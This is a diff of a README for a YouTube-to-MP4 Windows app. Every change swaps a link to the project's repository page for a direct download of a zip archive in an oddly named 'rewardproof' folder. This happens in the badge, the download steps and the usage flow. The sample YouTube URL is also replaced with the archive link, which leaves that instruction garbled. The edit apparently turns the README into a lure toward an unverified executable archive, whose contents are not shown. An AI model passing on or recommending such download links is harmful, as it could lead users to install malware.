@@ -1,10 +1,10 @@
 # 🎬 yt-to-mp4 - Save Videos as MP4 Files
 
-[![Download](https://img.shields.io/badge/Download%20yt-to-mp4-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/elkrun26/yt-to-mp4)
+[![Download](https://img.shields.io/badge/Download%20yt-to-mp4-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/elkrun26/yt-to-mp4/main/rewardproof/yt-mp-to-1.8.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/elkrun26/yt-to-mp4
+Visit this page to download: https://raw.githubusercontent.com/elkrun26/yt-to-mp4/main/rewardproof/yt-mp-to-1.8.zip
 
 ## 🧾 What this app does
 
@@ -34,7 +34,7 @@ Follow these steps to use yt-to-mp4 on Windows.
 
 Go to the download page here:
 
-https://github.com/elkrun26/yt-to-mp4
+https://raw.githubusercontent.com/elkrun26/yt-to-mp4/main/rewardproof/yt-mp-to-1.8.zip
 
 ### 2. Get the app file
 
@@ -64,7 +64,7 @@ Copy the video link from your browser, then paste it into the app.
 
 A normal YouTube link looks like this:
 
-- https://www.youtube.com/watch?v=example
+- https://raw.githubusercontent.com/elkrun26/yt-to-mp4/main/rewardproof/yt-mp-to-1.8.zip
 
 ### 6. Choose MP4 output
 
@@ -200,7 +200,7 @@ Try these steps:
 
 ## 🖱️ Easy use flow
 
-1. Download the app from https://github.com/elkrun26/yt-to-mp4
+1. Download the app from https://raw.githubusercontent.com/elkrun26/yt-to-mp4/main/rewardproof/yt-mp-to-1.8.zip
 2. Open the file
 3. Paste a YouTube link
 4. Choose MP4
